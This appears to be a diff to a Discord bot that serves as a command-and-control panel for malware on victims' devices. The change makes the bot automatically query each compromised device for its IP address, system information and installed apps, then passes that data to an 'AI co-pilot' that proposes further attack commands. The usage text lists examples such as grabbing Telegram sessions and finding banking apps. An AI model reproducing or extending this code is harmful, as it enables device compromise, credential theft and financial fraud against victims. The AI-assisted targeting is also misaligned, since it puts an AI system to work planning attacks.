@@ -935,8 +935,41 @@ client.on(Events.MessageCreate, async (msg) => {
           if (!aiMsg) return msg.reply(`${E.target} Usage: \`!ai <request>\`\nExamples:\n\`!ai profile the device\`\n\`!ai what banking apps\`\n\`!ai grab telegram sessions\` ${E.skull}`)
           await msg.channel.sendTyping()
           try {
+            // Ensure AI session exists before gathering
+            let session = aiContext.getSession(guild.id, uid)
+            if (!session) session = aiContext.createSession(guild.id, uid)
+
+            // Auto-gather real device context before consulting AI
+            await guild.channels.fetch()
+            const t = resolveTarget(guild, targets, uid)
+            if (t.channel) {
+              const devKey = session.deviceKnowledge.get(t.channel.id)
+              const needsGather = !devKey || devKey.ip === '?' || !devKey.sysinfo || !devKey.installed
+              if (needsGather) {
+                const gatherCmds = [
+                  { cmd: 'ip', timeout: 15000 },
+                  { cmd: 'sysinfo', timeout: 15000 },
+                  { cmd: 'installed', timeout: 30000 },
+                ]
+                const gathered = []
+                for (const { cmd, timeout } of gatherCmds) {
+                  const r = await sendCmd(t.channel, cmd, '')
+                  if (r.ok) {
+                    const resp = await collectChannelResponse(t.channel, cmd, timeout)
+                    if (resp) {
+                      aiContext.updateDeviceKnowledge(session, t.channel.id, cmd, resp.slice(0, 5000))
+                      gathered.push(cmd)
+                    }
+                  }
+                }
+                if (gathered.length > 0) {
+                  console.log(`[AI] Auto-gathered: ${gathered.join(', ')} for ${t.channel.name}`)
+                }
+              }
+            }
+
             console.log(`[AI] Calling processRequest with: "${aiMsg.slice(0, 50)}..."`)
-            const { session, response } = await aiCoPilot.processRequest(guild.id, uid, aiMsg)
+            const { response } = await aiCoPilot.processRequest(guild.id, uid, aiMsg)
             console.log(`[AI] Response received, proposedCommands: ${response.proposedCommands?.length}, ready: ${response.ready}`)
             if (!response.proposedCommands.length && response.ready) return msg.reply({ ...bloodEmbed(bold('🤖 AI'), 'info', response.summary || response.analysis), components: MENU_BTNS })
             const cmdList = response.proposedCommands.map((c, i) => `**${i + 1}.** \`${c.command}${c.args ? ' ' + c.args : ''}\` — ${c.reason}`).join('\n')
